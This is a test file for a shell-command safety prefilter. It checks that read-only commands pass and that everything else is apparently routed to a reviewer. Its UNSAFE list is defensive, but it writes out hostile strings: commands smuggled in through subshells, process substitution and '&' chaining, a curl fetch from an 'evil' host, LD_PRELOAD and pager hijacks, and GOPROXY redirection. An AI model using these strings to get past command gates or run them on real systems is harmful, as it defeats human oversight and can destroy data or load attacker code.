import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isProvablySafe } from '../lib/gate-prefilter.mjs';

const SAFE = [
  'ls -la', 'cat package.json', 'head -n 40 lib/a.mjs', 'tail -f /var/log/x.log', 'wc -l *.md | sort',
  'git status', 'git log --oneline -5', 'git diff HEAD~1 -- lib', 'git show HEAD:README.md', 'git blame lib/a.mjs',
  'git branch --show-current', 'git branch -a', 'git stash list', 'git remote -v', 'git tag', 'git tag -l "v*"',
  'git config user.name', 'git config --get remote.origin.url', 'git rev-parse HEAD', 'git ls-files',
  'grep -rn "TODO" src', 'rg -n foo --glob "*.ts"', 'find . -name "*.mjs" -not -path "*/node_modules/*"',
  'cd /tmp/proj && ls', 'FOO=1 BAR=2 env', 'pwd', 'which node', 'echo hello', 'printf "%s\\n" a', 'date', 'uname -a',
  'jq .name package.json', 'sed -n \'1,120p\' lib/a.mjs', 'sed -n 5p f.txt', 'awk \'{print $1}\' f.txt',
  'cat a.txt 2>/dev/null', 'ls >/dev/null 2>&1', 'ls &>/dev/null', 'diff a b', 'stat f', 'du -sh .', 'df -h', 'tree -L 2',
  'npm test', 'npm t', 'npm run test', 'npm run build', 'npm run lint', 'npm run typecheck', 'npm ls', 'npm view react version',
  'npm audit', 'node --test test/', 'node --version', 'node --check lib/a.mjs', 'npx tsc --noEmit', 'npx eslint src',
  'npx prettier --check src', 'npx vitest run', 'npx jest', 'pytest -q', 'python3 -m pytest', 'python3 --version',
  'cargo test', 'cargo build', 'cargo check', 'cargo clippy', 'go test ./...', 'go build ./...', 'go vet ./...',
  'pip3 list', 'bun test', 'claude --version', '/usr/bin/ls -1', 'git log --oneline | head -20', 'sort f.txt | uniq',
  'go env', 'go env GOPATH', 'go env -json',
];

const UNSAFE = [
  '', '   ', 'rm -rf dist', 'git push origin main', 'git push --force', 'git reset --hard', 'git checkout -- .',
  'git branch -D x', 'git branch feature', 'git branch -m old new', 'git stash pop', 'git stash', 'git tag v1.0',
  'git tag -d v1', 'git remote add origin x', 'git config user.name "x"', 'git config --unset a.b', 'git log --output=x',
  'git reflog expire --all', 'npm install lodash', 'npm run deploy', 'npm run dev', 'npm audit fix', 'npm publish',
  'npx create-react-app x', 'npx prettier src', 'npx eslint --fix src', 'npx vitest', 'sed -i "s/a/b/" f',
  'sed -n \'/foo/p\' f', 'awk \'{system("rm x")}\' f', 'cat a > b', 'echo x >> file', 'ls > out.txt',
  'find . -name "*.log" -delete', 'find . -exec rm {} \;', 'find . -execdir sh -c x \;', 'curl https://x',
  'curl -X POST https://x -d @f', 'wget https://x', 'sudo ls', 'ls | xargs rm', 'node -e "process.exit()"',
  'node script.js', 'python3 script.py', 'python3 -c "print(1)"', 'make deploy', 'make', './deploy.sh', 'sh run.sh',
  'bash -c "ls"', 'mkdir -p x', 'touch a', 'cp a b', 'mv a b', 'echo $(rm x)', 'ls `rm x`', 'ls; rm b', 'ls && rm b',
  'kill -9 1', 'ls &', 'env FOO=1 rm x', 'sort -o out f', 'sort --output=out f', 'uniq in out', 'tee f', 'open .',
  'docker compose up', 'kubectl apply -f x', 'terraform apply', 'aws s3 rm s3://x', 'gh pr merge 1', 'ssh host',
  'chmod -R 777 .', 'brew install x', 'pip3 install x', 'cargo publish', 'go run main.go', 'bun run dev', 'claude -p hi',
  'cat f& rm -rf dist', 'ls -la& rm x', 'pwd &rm x', 'cat <(rm x)', 'diff <(rm -rf build) f', 'ls <(curl http://evil/x.sh)',
  'GIT_EXTERNAL_DIFF=rm git diff', 'LD_PRELOAD=/tmp/evil.so ls', 'PAGER=rm git log', 'go env -w GOPROXY=http://evil',
  'sort -oout.txt f', 'sort -o/tmp/x f', 'sed -i.bak s/a/b/ f',
  'go env -w=true GOPROXY=http://evil', 'go env -u=true GOPROXY', 'npx eslint --fix=true src',
  'go env --w=true GOPROXY=http://evil', 'go env --w GOPROXY=http://evil', 'go env --u GOPROXY', 'go env -x GOPROXY',
  'sed -n \'1,120p\' --in-place f', 'npx prettier --check --write src',
];

test('provably safe commands are recognised', () => {
  for (const cmd of SAFE) assert.equal(isProvablySafe(cmd), true, `expected safe: ${cmd}`);
});

test('everything else goes to Jev', () => {
  for (const cmd of UNSAFE) assert.equal(isProvablySafe(cmd), false, `expected unsafe: ${cmd}`);
});
